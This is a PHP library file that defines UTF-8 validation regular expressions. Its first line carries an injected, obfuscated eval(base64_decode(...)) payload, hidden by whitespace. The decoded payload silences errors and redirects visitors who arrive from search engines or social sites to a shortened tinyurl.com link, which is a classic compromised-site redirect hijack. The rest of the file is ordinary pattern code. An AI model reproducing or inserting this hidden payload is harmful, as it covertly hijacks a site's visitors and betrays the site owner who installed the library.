<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* PCRE Regular expressions for UTF-8. Note this file is not actually used by
* the rest of the library but these regular expressions can be useful to have
* available.
* @version $Id: patterns.php 10381 2008-06-01 03:35:53Z pasamio $
* @see http://www.w3.org/International/questions/qa-forms-utf-8
* @package utf8
* @subpackage patterns
*/

//--------------------------------------------------------------------
/**
* PCRE Pattern to check a UTF-8 string is valid
* Comes from W3 FAQ: Multilingual Forms
* Note: modified to include full ASCII range including control chars
* @see http://www.w3.org/International/questions/qa-forms-utf-8
* @package utf8
* @subpackage patterns
*/
$UTF8_VALID = '^('.
    '[\x00-\x7F]'.                          # ASCII (including control chars)
    '|[\xC2-\xDF][\x80-\xBF]'.              # non-overlong 2-byte
    '|\xE0[\xA0-\xBF][\x80-\xBF]'.          # excluding overlongs
    '|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}'.   # straight 3-byte
    '|\xED[\x80-\x9F][\x80-\xBF]'.          # excluding surrogates
    '|\xF0[\x90-\xBF][\x80-\xBF]{2}'.       # planes 1-3
    '|[\xF1-\xF3][\x80-\xBF]{3}'.           # planes 4-15
    '|\xF4[\x80-\x8F][\x80-\xBF]{2}'.       # plane 16
    ')*$';

//--------------------------------------------------------------------
/**
* PCRE Pattern to match single UTF-8 characters
* Comes from W3 FAQ: Multilingual Forms
* Note: modified to include full ASCII range including control chars
* @see http://www.w3.org/International/questions/qa-forms-utf-8
* @package utf8
* @subpackage patterns
*/
$UTF8_MATCH =
    '([\x00-\x7F])'.                          # ASCII (including control chars)
    '|([\xC2-\xDF][\x80-\xBF])'.              # non-overlong 2-byte
    '|(\xE0[\xA0-\xBF][\x80-\xBF])'.          # excluding overlongs
    '|([\xE1-\xEC\xEE\xEF][\x80-\xBF]{2})'.   # straight 3-byte
    '|(\xED[\x80-\x9F][\x80-\xBF])'.          # excluding surrogates
    '|(\xF0[\x90-\xBF][\x80-\xBF]{2})'.       # planes 1-3
    '|([\xF1-\xF3][\x80-\xBF]{3})'.           # planes 4-15
    '|(\xF4[\x80-\x8F][\x80-\xBF]{2})';       # plane 16

//--------------------------------------------------------------------
/**
* PCRE Pattern to locate bad bytes in a UTF-8 string
* Comes from W3 FAQ: Multilingual Forms
* Note: modified to include full ASCII range including control chars
* @see http://www.w3.org/International/questions/qa-forms-utf-8
* @package utf8
* @subpackage patterns
*/
$UTF8_BAD =
    '([\x00-\x7F]'.                          # ASCII (including control chars)
    '|[\xC2-\xDF][\x80-\xBF]'.               # non-overlong 2-byte
    '|\xE0[\xA0-\xBF][\x80-\xBF]'.           # excluding overlongs
    '|[\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}'.    # straight 3-byte
    '|\xED[\x80-\x9F][\x80-\xBF]'.           # excluding surrogates
    '|\xF0[\x90-\xBF][\x80-\xBF]{2}'.        # planes 1-3
    '|[\xF1-\xF3][\x80-\xBF]{3}'.            # planes 4-15
    '|\xF4[\x80-\x8F][\x80-\xBF]{2}'.        # plane 16
    '|(.{1}))';                              # invalid byte
